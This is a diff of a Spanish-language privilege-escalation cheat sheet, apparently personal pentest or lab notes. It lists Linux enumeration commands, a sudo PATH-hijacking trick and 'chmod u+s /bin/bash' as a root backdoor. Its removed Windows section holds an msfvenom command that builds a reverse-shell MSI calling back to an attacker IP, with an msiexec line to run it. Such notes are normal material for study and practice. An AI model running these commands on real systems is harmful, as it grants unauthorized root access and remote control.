@@ -1,13 +1,11 @@
-	#### Linux
-
-	### Buscar binarios
+        ### Buscar binarios
 find / -perm -u=s -type f 2> /dev/null
 https://gtfobins.github.io/#
 #Binarios linux
 find / -perm -4000 2> /dev/null
 #Binarios con SUID
 
-	### Comandos basicos
+        ### Comandos basicos
 su <user>
 #Cambiar de usuario con la pswd del usr
 chmod u+s /bin/bash
@@ -16,7 +14,7 @@ sudo -l
 #Ver privilegios asignados y que podemos correr como sudo sin pswd
 #Podemos ejecutar sin pswd? -> Ver privilegios del binario/archivo
 
-	### Comandos de busqueda
+        ### Comandos de busqueda
 ps -faux
 #Listar procesos
 grep -R "<palabra>" /<dir a buscar> 2>/dev/null
@@ -30,7 +28,7 @@ find / -type f -name "doas.conf" 2>/dev/null
 #Busca por la configuracion de doas. Permite ejecutar comandos como otro usuario (root como default)
 #En dicha configuracion puede estar establecido que se puede ejecutar con X usuario como root sin password. Es parecido a sudo -l
 
-	### Path hijacking
+        ### Path hijacking
 #Si encontramos un SETENV: quiere decir que, antes del script que se puede ejecutar como sudo sin pswd, podemos agregar un ENV.
 #De esta forma, si existe un condicional que usa [, es posible abusarnos de la forma que linux interpreta discho caracteres para que nos ejecute otra cosa. Esto seria:
 sudo PATH=/tmp:$PATH script
@@ -40,7 +38,7 @@ sudo PATH=/tmp:$PATH script
 Esto (para el caso de '[') solo es posible si en .bashrc se encuentra una linea: enable -n [ # ]
 [!]
 
-	### Lugares a revisar
+        ### Lugares a revisar
 linpeas.sh
 #Escanea el sistema en busqueda de posibles vulnerabilidades
 kernel version
@@ -57,32 +55,9 @@ ps- faux | grep <puerto encontrado en netstat>
 #Al estar en el localhost, es posible de esta forma encontrar el directorio en el cual se encuentra la pagina e intentar buscar info que nos sea importante
 #Tambien, dependiendo el caso, se podria hacer pivoting. Ver txt sobre el tema
 
-	### Croonjobs
+        ### Croonjobs
 pspy (https://github.com/DominicBreuker/pspy)
 #Es un tool que permite ver las tareas que se ejecutan en un sistema en X tiempo.
 #upx <file>
 #Para bajarle el peso al aarchivo
 
-	#### Windows
-https://lolbas-project.github.io/#
-#Binarios windows
-
-### Comandos de busqueda
-net user <user>
-#Nos muestra la informacion de nuestro usuario: nombre, grupo, etc
-net localgroup <nombbre local group>
-#Nos muetra info del grupo, comentario, etc
-whoami /priv
-#Permite lista los privilegios
-whoami /all
-#Muestra toda la info dde nuestro perfil de usr
-tasklist
-#Procesos corriendo en el sistema
-
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-#Enumerar registros de Windows
-
-msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
-#Creo una reverse .msi
-msiexec /quiet /qn /i rev.msi
-#Ejecuto la reverse en el target para obtener shell como root en mi listener
